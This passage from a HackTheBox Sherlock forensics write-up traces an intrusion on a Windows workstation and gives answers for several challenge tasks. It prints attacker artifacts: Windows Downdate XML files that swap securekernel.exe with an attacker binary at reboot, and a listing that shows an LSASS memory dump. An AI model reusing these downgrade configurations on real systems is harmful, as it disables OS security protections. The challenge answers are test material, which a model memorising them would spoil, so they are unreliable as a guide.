  S-1-5-21-3784066801-3323226808-2505544950-512
  S-1-5-21-3718134835-1919426685-3059265731-1002

Group Name    : Power Users [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Power Users are included for backwards compatibility and possess limited administrative powers
Users         : None

Group Name    : Cryptographic Operators [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members are authorized to perform cryptographic operations.
Users         : None

Group Name    : Remote Management Users [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Users         : None

Group Name    : Replicator [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Supports file replication in a domain
Users         : None

Group Name    : Performance Monitor Users [0]
LastWrite     : Tue Sep 10 17:40:18 2024 Z
Group Comment : Members of this group can access performance counter data locally and remotely
Users         : None

Group Name    : Remote Desktop Users [3]
LastWrite     : Tue Oct 22 15:20:51 2024 Z
Group Comment : Members in this group are granted the right to logon remotely
Users :
  S-1-1-0
  S-1-5-21-3784066801-3323226808-2505544950-512
  S-1-5-21-3784066801-3323226808-2505544950-513

Analysis Tips:
 - For well-known SIDs, see http://support.microsoft.com/kb/243330
     - S-1-5-4  = Interactive
     - S-1-5-11 = Authenticated Users
 - Correlate the user SIDs to the output of the ProfileList plugin

----------------------------------------
```

Welp, this was somewhat informative, but I thought the `arjun.patel` user initiated this command to create the user, but no!

- **Target Account Name**: The name of the user that was created.
- **Subject**: The account name and domain of the user who performed the action.

So the account that created new account was 
```bash
      "SubjectDomainName": "STORED",
      "SubjectUserName": "WORKSTATION9$",
      "SubjectUserSid": "S-1-5-18",
      "TargetDomainName": "WORKSTATION9",
      "TargetSid": "S-1-5-21-3718134835-1919426685-3059265731-1003",
      "TargetUserName": "Chhupa",
```

::: tip :bulb: Answer
`S-1-5-18`
:::

### Task 10. What is the original name of the exploit binary the threat actor used to bypass several Windows security features?

From previously we know what commands were ran by this user by reading the `./Magic Show/C/Users/Chhupa/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`
```bash
└─$ pwd && ls -lh
/media/sf_VBoxShare/Magic Show/C/Users/Chhupa/Desktop
Permissions Size User Date Modified Name
.rwxrwx---   197 root 22 Oct 17:35  config.xml.txt
.rwxrwx---  8.7M root 22 Oct 17:00  dd.exe
.rwxrwx---   577 root 22 Oct 17:35  Downgrade.xml
.rwxrwx---   84M root 22 Oct 17:39  lsass.DMP
.rwxrwx---     0 root 22 Oct 17:34  test.exe

└─$ cat config.xml.txt
<Configuration>
    <UpdateFilesList>
        <UpdateFile source="C:\Users\Chhupa\Desktop\test.exe" destination="C:\Windows\System32\securekernel.exe" />
    </UpdateFilesList>
</Configuration>                                                                                                                                                                                                  

└─$ cat Downgrade.xml
<?xml version='1.0' encoding='utf-8'?>
<PendingTransaction Version="3.1" WcpVersion="10.0.22621.2567 (WinBuild.160101.0800)" Identifier="916ae75edb30da0146730000dc1be027">
        <Transactions>
        </Transactions>
        <ChangeList>
        </ChangeList>
        <POQ postAction="reboot">
                <HardlinkFile source="\??\C:\Users\Chhupa\Desktop\test.exe" destination="\??\C:\Windows\System32\securekernel.exe" />
        </POQ>
        <POQ>
        </POQ>
        <InstallerQueue Length="0x00000000">
        </InstallerQueue>
        <RollbackInformation>
                <AdminHints>
                </AdminHints>
        </RollbackInformation>
</PendingTransaction>

└─$ sha256sum dd.exe
c204dc4c06d97a3df65a36ece3ead1800cdc74f295e23f9fd58ed545e7f0a2a7  dd.exe
```

[https://www.virustotal.com/gui/file/c204dc4c06d97a3df65a36ece3ead1800cdc74f295e23f9fd58ed545e7f0a2a7/community](https://www.virustotal.com/gui/file/c204dc4c06d97a3df65a36ece3ead1800cdc74f295e23f9fd58ed545e7f0a2a7/community)

![Writeup-7.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-7.png)

In Details, under Names we have alternative names.

![Writeup-8.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-8.png)

::: tip :bulb: Answer
`windows_downdate.exe`
:::

### Task 11. What time did the threat actor first run the exploit? (UTC)

AppCompat cache is showing that this binary wasn't ran, but that's not true.

![Writeup-9.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-9.png)

Prefetch has more information about run times, the first time for some reason is inside PreviousRun5

![Writeup-10.png](/assets/soc/sherlocks/opsalwarkameez24-2-magic-show/Writeup-10.png)

::: tip :bulb: Answer
`2024-10-22 22:31:43`
:::

### Task 12. Which account owns the files manipulated by the exploit?

HTB Subscription Ended

![letmein](https://media.tenor.com/HFSzdKD66AgAAAAM/what-nani.gif)

[https://systemweakness.com/hackthebox-sherlocks-write-up-opsalwarkameez24-2-magic-show-e45712294319](https://systemweakness.com/hackthebox-sherlocks-write-up-opsalwarkameez24-2-magic-show-e45712294319)











